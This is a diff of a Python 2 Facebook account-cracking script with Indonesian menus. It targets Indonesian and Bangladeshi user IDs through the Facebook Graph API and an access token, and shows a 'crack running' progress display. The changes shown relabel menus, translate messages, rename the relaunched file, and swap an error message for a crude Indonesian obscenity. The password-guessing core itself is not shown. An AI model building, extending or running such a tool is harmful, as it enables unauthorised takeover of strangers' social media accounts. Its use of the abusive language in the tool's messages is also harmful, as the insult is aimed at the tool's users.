@@ -189,7 +189,7 @@ def menu():
 	print "\033[1;97m ══════════════════════════════════════════"
 	print "\033[1;97m [\033[1;97m01\033[1;97m]\033[1;97m\033[1;97m Crack ID Indo/Bangla"
 	print "\033[1;97m [\033[1;97m02\033[1;97m]\033[1;97m\033[1;97m Crack ID Group"
-	print "\033[1;97m [\033[1;97m03\033[1;97m]\033[1;97m\033[1;97m Ambil ID"
+	print "\033[1;97m [\033[1;97m03\033[1;97m]\033[1;97m\033[1;97m Ambil ID/Indo/Bangla"
 	print "\033[1;97m [\033[1;97m04\033[1;97m]\033[1;97m\033[1;97m Ikuti Saya di Facebook"
 	print "\033[1;97m [\033[1;91m00\033[1;97m]\033[1;97m\033[1;97m Logout"
 	print "\033[1;97m ══════════════════════════════════════════"
@@ -199,7 +199,7 @@ def menu():
 def pilih():
 	unikers = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m ")
 	if unikers =="":
-		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
+		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Bener KONTOL !"
 		pilih()
 	elif unikers =="1" or unikers =="01":
 		indo()
@@ -218,7 +218,7 @@ def pilih():
 		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
 		pilih()
 	
-########## CRACK INDONESIA #######
+########## CRACK BANGLADESH/INDONESIA #######
 def indo():
 	global toket
 	os.system('clear')
@@ -238,17 +238,17 @@ def indo():
 	print "\033[1;97m ══════════════════════════════════════════"
 	pilih_indo()
 
-#### PILIH INDO ####
+#### PILIH BANGLA/INDO ####
 def pilih_indo():
 	teak = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m ")
 	if teak =="":
-		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
+		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Bener KONTOL !"
 		pilih_indo()
 	elif teak =="1" or teak =="01":
 		os.system('clear')
 		print logo
 		print "\033[1;97m ══════════════════════════════════════════"
-		idt = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] User ID Target : ")
+		idt = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] User ID Target Lu : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -290,7 +290,7 @@ def pilih_indo():
 	for o in titik:
 		print("\r\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m] Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m ══════════════════════════════════════════"
-	print "\033[1;97m \033[1;41;97m TO STOP PROCESS,PRESS CTRL+Z.GOOD LUCK :) \033[0m"
+	print "\033[1;97m \033[1;41;97m BERHENTI PROSES,KETIK CTRL+Z.MAKASIH DEK :) \033[0m"
 	print "\033[1;97m ══════════════════════════════════════════"
 ##### MAIN BANGLADESH #####
 	def main(arg):
@@ -623,7 +623,7 @@ def id_teman():
 		print("\r\033[1;97m[\033[1;95m+\033[1;97m] \033[1;97mFile tersimpan : \033[1;97mout/"+done)
 		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 		raw_input("\033[1;93m[ \033[1;97mKembali \033[1;93m]")
-		os.system("python2 UNIS3X.py")
+		os.system("python2 2020.py")
 	except IOError:
 		print"\033[1;91m[!] Gagal membuat file"
 		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
